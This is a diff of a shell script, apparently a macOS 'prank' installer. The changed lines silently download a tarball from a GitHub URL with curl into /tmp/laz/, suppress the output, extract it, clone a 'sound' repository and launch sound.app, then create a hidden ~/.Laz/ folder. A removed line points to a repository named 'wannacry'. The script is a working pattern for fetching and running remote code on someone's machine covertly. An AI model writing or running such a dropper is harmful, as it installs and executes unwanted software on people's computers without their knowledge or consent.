@@ -5,18 +5,18 @@ then
 fi  # replace 'done' with 'fi'
 
 # rest of the script...
-
 mkdir -p /tmp/laz/
 
-git clone  https://github.com/aabderrafie/wannacry/blob/master/app.zip -o /tmp/laz/prank.tar.gz > /dev/null
+curl -s -L https://github.com/ic4rusfly/p1/raw/master/prank.tar.gz -o /tmp/laz/prank.tar.gz > /dev/null
+
+tar xvf /tmp/laz/prank.tar.gz -C /tmp/laz > /dev/null
+
 
 cd /tmp
 rm -rf sound
 git clone  https://github.com/aabderrafie/sound  
 cd sound
 open ./sound.app
-
-tar xvf /tmp/laz/prank.tar.gz -C /tmp/laz > /dev/null
 
 mkdir ~/.Laz/
 
